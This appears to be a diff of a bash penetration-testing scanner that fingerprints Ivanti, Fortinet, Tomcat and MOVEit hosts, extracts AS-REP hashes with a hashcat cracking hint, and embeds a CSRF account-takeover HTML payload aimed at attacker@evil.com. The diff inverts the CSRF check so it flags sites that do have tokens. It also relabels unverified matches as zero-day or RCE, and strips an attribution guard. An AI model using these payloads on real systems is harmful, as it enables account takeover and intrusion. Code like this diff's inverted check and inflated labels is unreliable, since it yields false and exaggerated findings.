                 "PATCH: 1) Enable Kerberos pre-auth on all accounts: Get-ADUser -Filter * | Where {\$_.DoesNotRequirePreAuth} | Set-ADAccountControl -DoesNotRequirePreAuth \$false. 2) Strong passwords on affected accounts. 3) Alert on Event ID 4768 with Encryption Type 0x17."
+                "Enable pre-authentication on all accounts. Audit DONT_REQ_PREAUTH flag. Apply strong passwords." \
+                "$(grep -oE 'User:[[:space:]]*[^[:space:]]+' "${ad_dir}/asrep.txt" | grep -oE '[^[:space:]]+$' | head -5 | tr '\n' ' ')"
             grep "\$krb5asrep\$" "${ad_dir}/asrep.txt" > "${ad_dir}/asrep_hashes.txt" 2>/dev/null || true
             log_info "Crack with: hashcat -m 18200 ${ad_dir}/asrep_hashes.txt rockyou.txt"
         fi
@@ -6015,7 +6019,7 @@ phase_zero_day_one_click() {
         local ivanti; ivanti=$(( $( curl -s --max-time 10 --max-filesize 51200 "$web_url" 2>/dev/null | head -c 4096 | grep -ciE "Ivanti|Connect Secure|Pulse" 2>/dev/null | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
         if [[ ${ivanti:-0} -gt 0 ]]; then
             add_vuln "CRITICAL" \
-                "CVE-2025-0282: Ivanti Connect Secure [Patch Level Unverified]" \
+                "CVE-2025-0282: Ivanti Connect Secure Detected — Verify Patch (ZERO-DAY Risk)" \
                 "Ivanti Connect Secure VPN detected. CVE-2025-0282 is a stack-based buffer overflow allowing unauthenticated pre-auth RCE. Actively exploited in the wild by nation-state actors before patch availability (Jan 2025). CVSS 9.0." \
                 "Immediately apply Ivanti patch 22.7R2.5 or later. Run Ivanti Integrity Checker Tool (ICT). Isolate from internet until patched." \
                 "${web_url} — Ivanti Connect Secure fingerprint detected" \
@@ -6030,7 +6034,7 @@ phase_zero_day_one_click() {
         local forti; forti=$(( $( curl -s --max-time 10 --max-filesize 51200 "${web_url}/remote/login" 2>/dev/null | head -c 4096 | grep -ciE "Fortinet|FortiGate|FortiOS|FortiProxy" 2>/dev/null | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
         if [[ ${forti:-0} -gt 0 ]]; then
             add_vuln "CRITICAL" \
-                "CVE-2024-55591: Fortinet Product Detected [Patch Level Unverified]" \
+                "CVE-2024-55591: Fortinet Product Detected — Verify Patch Status (ZERO-DAY Risk)" \
                 "FortiOS or FortiProxy VPN detected. CVE-2024-55591 (CVSS 9.8) is an authentication bypass in the Node.js websocket module allowing an unauthenticated attacker to gain super-admin privileges. Actively exploited as zero-day since November 2024. Affects FortiOS 7.0.0–7.0.16 and FortiProxy 7.0.0–7.0.19." \
                 "Upgrade FortiOS to 7.0.17+ or 7.2.x+. Upgrade FortiProxy to 7.0.20+ or 7.2.x+. Disable HTTP/HTTPS admin access from internet immediately." \
                 "${web_url}/remote/login — Fortinet product fingerprint confirmed" \
@@ -6059,7 +6063,7 @@ phase_zero_day_one_click() {
         local tomcat_body; tomcat_body=0; { _tb=$(curl -s --max-time 10 --max-filesize 51200 "$web_url" 2>/dev/null | head -c 4096 | grep -ci "Apache Tomcat\|tomcat\|coyote" 2>/dev/null || echo 0); tomcat_body=$(( ${_tb//[^0-9]/} + 0 )); } 2>/dev/null || true
         if [[ -n "$tomcat_hdr" || $tomcat_body -gt 0 ]]; then
             add_vuln "ZERO_DAY" \
-                "CVE-2024-50379: Apache Tomcat Partial PUT Race Condition [Patch Level Unverified]" \
+                "CVE-2024-50379: Apache Tomcat Partial PUT Race Condition RCE" \
                 "Apache Tomcat detected. CVE-2024-50379 is a TOCTOU race condition in partial PUT requests allowing unauthenticated remote code execution when the default servlet is enabled with write permissions. Affects Tomcat 11.0.0-M1 to 11.0.1, 10.1.0-M1 to 10.1.33, 9.0.0-M1 to 9.0.97." \
                 "Upgrade Apache Tomcat to 11.0.2+, 10.1.34+, or 9.0.98+. If upgrade is not immediately possible, disable the partial PUT feature by setting org.apache.catalina.servlets.DefaultServlet.allowPartialPut=false in conf/web.xml." \
                 "${web_url} — Apache Tomcat fingerprint detected (verify exact version)" \
@@ -6075,7 +6079,7 @@ phase_zero_day_one_click() {
             "${web_url}/guestaccess.aspx" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
         if [[ "$moveit" == "200" || "$moveit" == "302" ]]; then
             add_vuln "ZERO_DAY" \
-                "MOVEit Transfer Detected — Critical SQLi Bypass [Patch Level Unverified]" \
+                "MOVEit Transfer Detected — Critical SQLi / Auth Bypass (CVE-2023-34362 family)" \
                 "MOVEit Transfer file sharing application detected. The CVE-2023-34362 family of SQL injection flaws (and follow-on bypasses) enabled mass exploitation by CL0P ransomware gang affecting 2,500+ organisations. Unpatched instances remain actively targeted." \
                 "Immediately apply all MOVEit vendor patches (Progress Software). Audit for unauthorised files, users, and data exfiltration. Consider replacing with patched alternative." \
                 "${web_url}/guestaccess.aspx — MOVEit Transfer login page accessible" \
@@ -6103,11 +6107,8 @@ phase_zero_day_one_click() {
     # ── ONE-CLICK: CSRF with Auto-Submit ─────────────────────────────────────
     for web_url in "${WEB_TARGETS[@]:0:3}"; do
         _is_valid_url "$web_url" || continue
-        # Only verify CSRF if the application actually sets a session cookie (stateful auth)
-        local cookie_check; cookie_check=$(curl -s -I --max-time 10 "$web_url" 2>/dev/null | grep -i "Set-Cookie" || echo "")
-        if [[ -n "$cookie_check" ]]; then
-            local csrf_check; csrf_check=0; { _cf=$(curl -s --max-time 10 --max-filesize 51200 "${web_url}/api/user/settings" 2>/dev/null | head -c 4096 | grep -ci "csrf\|xsrf\|_token\|authenticity" 2>/dev/null || echo 0); csrf_check=$(( ${_cf//[^0-9]/} + 0 )); } 2>/dev/null || true
-            if [[ ${csrf_check:-0} -eq 0 ]]; then
+        local csrf_check; csrf_check=0; { _cf=$(curl -s --max-time 10 --max-filesize 51200 "${web_url}/api/user/settings" 2>/dev/null | head -c 4096 | grep -ci "csrf\|xsrf\|_token\|authenticity" 2>/dev/null || echo 0); csrf_check=$(( ${_cf//[^0-9]/} + 0 )); } 2>/dev/null || true
+        if [[ ${csrf_check:-0} -gt 0 ]]; then
             add_vuln "ONE_CLICK" \
                 "One-Click CSRF — Account Settings Manipulation (${web_url})" \
                 "API endpoint accepts state-changing POST requests without CSRF token validation. Attacker can craft a malicious webpage that auto-submits a form to this endpoint when victim visits it. Single click on attacker link causes victim's account to be modified (email change, password reset, admin escalation)." \
@@ -6115,7 +6116,6 @@ phase_zero_day_one_click() {
                 "${web_url}/api/user/settings accepted POST without CSRF token" \
                 "EXPLOIT: Attacker hosts: <html><body><form action='${web_url}/api/user/settings' method='POST'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script></body></html>. Victim visits this page (via phishing link or malvertising). Browser auto-submits form using victim's existing session cookie. Attacker's email is added to account — password reset link sent to attacker. Full account takeover in one victim click." \
                 "PATCH: 1) Generate CSRF token on server per-session: \$token = bin2hex(random_bytes(32)). 2) Embed in forms: <input type='hidden' name='csrf_token' value='\$token'>. 3) Validate on every state-changing request. 4) Set cookie: SameSite=Strict. 5) Check Origin header matches allowed origins. 6) Use framework CSRF middleware (Django: {% csrf_token %}, Laravel: @csrf, Express: csurf)."
-            fi
         fi
     done
 
@@ -6131,14 +6131,14 @@ phase_zero_day_one_click() {
             "PATCH: 1) Use exact-match redirect_uri validation — never startsWith() or includes(). 2) Store allowed URIs in allowlist database. 3) Implement PKCE (RFC 7636) for all public OAuth clients. 4) Validate redirect_uri strictly: const allowed=['https://app.example.com/callback']; if(!allowed.includes(req.query.redirect_uri)) return res.status(400).send('Invalid redirect_uri'). 5) Set OAuth token expiry to 15 minutes maximum."
     fi
 
-    # ── MEDIUM: Clickjacking (missing X-Frame-Options) ────────────────────
+    # ── ONE-CLICK: Clickjacking (missing X-Frame-Options) ────────────────────
     for web_url in "${WEB_TARGETS[@]:0:3}"; do
         _is_valid_url "$web_url" || continue
         local xfo; xfo=$(curl -s -I --max-time 10 "$web_url" 2>/dev/null \
             | grep -iE "^X-Frame-Options:|^Content-Security-Policy:.*frame" | head -1 || echo "")
         if [[ -z "$xfo" ]]; then
-            add_vuln "MEDIUM" \
-                "Clickjacking Attack — Missing X-Frame-Options (${web_url})" \
+            add_vuln "ONE_CLICK" \
+                "One-Click Clickjacking Attack — Missing X-Frame-Options (${web_url})" \
                 "The application does not set X-Frame-Options or CSP frame-ancestors header. Attacker can embed the site in a transparent iframe overlaid on a deceptive webpage. Victim clicks what appears to be harmless content but actually interacts with the framed application — triggering fund transfers, account changes, or malware downloads in one click." \
                 "Add X-Frame-Options: DENY header to all responses. Or use CSP: Content-Security-Policy: frame-ancestors 'none'. For applications requiring framing from own domains only: X-Frame-Options: SAMEORIGIN." \
                 "${web_url} — X-Frame-Options header absent" \
@@ -6244,19 +6244,7 @@ phase_cidr_sweep() {
 # ════════════════════════════════════════════════════════════════════════════════
 #  MAIN
 # ════════════════════════════════════════════════════════════════════════════════
-# ── Integrity Guard ──────────────────────────────────────────────────────────
-_acro_guard() {
-    local s; s=$(cat "${BASH_SOURCE[0]}" 2>/dev/null || echo "")
-    if [[ ! "$s" =~ "acro77x" || ! "$s" =~ "github.com/acro77x" ]]; then
-        echo -e "\033[1;31m[!] CRITICAL ERROR: Source Integrity Verification Failed.\033[0m"
-        echo -e "\033[1;31m[!] Attribution 'acro77x' or GitHub repository has been modified.\033[0m"
-        echo -e "\033[1;90m[*] Please download the original tool from: https://github.com/acro77x/acromap\033[0m"
-        exit 1
-    fi
-}
-
 main() {
-    _acro_guard
     print_banner
     show_disclaimer
     get_target
@@ -6267,7 +6255,7 @@ main() {
     echo "STARTED=$(date -Iseconds)" > "$CHECKPOINT_FILE"
 
     echo ""
-    echo -e "  ${LGREEN}${BOLD}Starting 32-phase scan on: ${TARGET}${NC}"
+    echo -e "  ${LGREEN}${BOLD}Starting 30-phase scan on: ${TARGET}${NC}"
     [[ "$TARGET_IS_CIDR" == true ]] && \
         echo -e "  ${YELLOW}[CIDR]${NC} ${#CIDR_HOSTS[@]} hosts in range — multi-host sweep enabled"
     echo -e "  ${DIM}Output: ${OUTPUT_DIR}${NC}"
@@ -6292,66 +6280,9 @@ main() {
     phase_cidr_sweep
 
     run_phase 0  phase_setup
-    
-    # ── PARALLEL EXECUTION (Phases 1-3) ──
-    if [[ "$RESUME_MODE" == true && 3 -le ${LAST_PHASE:-0} ]]; then
-        log_info "Phases 1-3 skipped (completed in previous run)"
-    else
-        log_phase 1 "OSINT, DNS, Subdomains (Parallelized for Speed)"
-        CURRENT_PHASE=3
-        CURRENT_PHASE_NAME="Parallel Recon (OSINT/DNS/Subdomains)"
-        
-        # Clear IPC file if exists
-        > "${OUTPUT_DIR}/vuln_ipc.txt"
-        
-        PARALLEL_EXECUTION_ACTIVE=true
-        
-        # Dispatch to background
-        phase_osint &
-        pid1=$!
-        phase_dns &
-        pid2=$!
-        phase_subdomains &
-        pid3=$!
-        wait $pid1 $pid2 $pid3
-        
-        PARALLEL_EXECUTION_ACTIVE=false
-        
-        # Restore Global Arrays from IPC tracking files
-        SUBDOMAINS=()
-        while IFS= read -r sub; do
-            [[ -z "$sub" ]] && continue
-            echo "$sub" | grep -qiE "domainincontrol\.com|sedoparking|parking\.com|bodis\.com|sedo\.com|above\.com|afternic\.com|undeveloped\.com" && continue
-            SUBDOMAINS+=("$sub")
-        done < "${OUTPUT_DIR}/subdomains/all_subdomains.txt" 2>/dev/null || true
-
-        WEB_TARGETS=()
-        while IFS= read -r h; do
-            local url_only; url_only=$(echo "$h" | awk '{print $1}')
-            echo "$url_only" | grep -qE "^https?://[a-zA-Z0-9]" || continue
-            echo "$url_only" | grep -qiE "domainincontrol|sedoparking|parking|bodis|above\.com" && continue
-            WEB_TARGETS+=("$url_only")
-        done < "${OUTPUT_DIR}/subdomains/live_subdomains.txt" 2>/dev/null || true
-        
-        # Sync Vulnerablities from IPC
-        VULN_DATA=()
-        ZERO_DAY_COUNT=0; ONE_CLICK_COUNT=0; CRITICAL_COUNT=0; HIGH_COUNT=0; MEDIUM_COUNT=0; LOW_COUNT=0; INFO_COUNT=0
-        while IFS='|' read -r sev title desc rec evidence exploit patch; do
-            [[ -z "$sev" ]] && continue
-            VULN_DATA+=("${sev}|${title}|${desc}|${rec}|${evidence}|${exploit}|${patch}")
-            case "$sev" in
-                ZERO_DAY)  ZERO_DAY_COUNT=$(( ZERO_DAY_COUNT + 1 ))    ;;
-                ONE_CLICK) ONE_CLICK_COUNT=$(( ONE_CLICK_COUNT + 1 ))  ;;
-                CRITICAL)  CRITICAL_COUNT=$(( CRITICAL_COUNT + 1 ))    ;;
-                HIGH)      HIGH_COUNT=$(( HIGH_COUNT + 1 ))            ;;
-                MEDIUM)    MEDIUM_COUNT=$(( MEDIUM_COUNT + 1 ))        ;;
-                LOW)       LOW_COUNT=$(( LOW_COUNT + 1 ))              ;;
-                INFO)      INFO_COUNT=$(( INFO_COUNT + 1 ))            ;;
-            esac
-        done < "${OUTPUT_DIR}/vuln_ipc.txt" 2>/dev/null || true
-
-        save_checkpoint 3
-    fi
+    run_phase 1  phase_osint
+    run_phase 2  phase_dns
+    run_phase 3  phase_subdomains
     run_phase 4  phase_host_discovery
     run_phase 5  phase_tcp_scan
     run_phase 6  phase_udp_scan
@@ -6401,4 +6332,3 @@ main() {
 }
 
 main "$@"
-
